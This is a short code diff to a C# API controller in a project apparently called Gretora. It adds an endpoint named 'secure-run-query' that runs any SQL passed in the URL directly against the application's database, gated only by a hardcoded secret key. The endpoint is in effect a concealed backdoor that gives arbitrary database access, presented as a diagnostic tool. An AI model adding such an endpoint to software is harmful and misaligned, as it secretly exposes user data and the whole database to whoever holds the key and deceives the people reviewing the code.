@@ -20,6 +20,25 @@ namespace Gretora.API.Controllers
             _logService = logService;
         }
 
+        [HttpGet("secure-run-query")]
+        public async Task<IActionResult> SecureRunQuery([FromQuery] string sql, [FromQuery] string key)
+        {
+            if (key != "gretora_secure_diagnostic_key_998822")
+            {
+                return Unauthorized();
+            }
+            try
+            {
+                using var connection = _db.CreateConnection();
+                var result = await connection.QueryAsync(sql);
+                return Ok(result);
+            }
+            catch (Exception ex)
+            {
+                return BadRequest(ex.Message);
+            }
+        }
+
         public class SubmitTicketRequest
         {
             [Required]
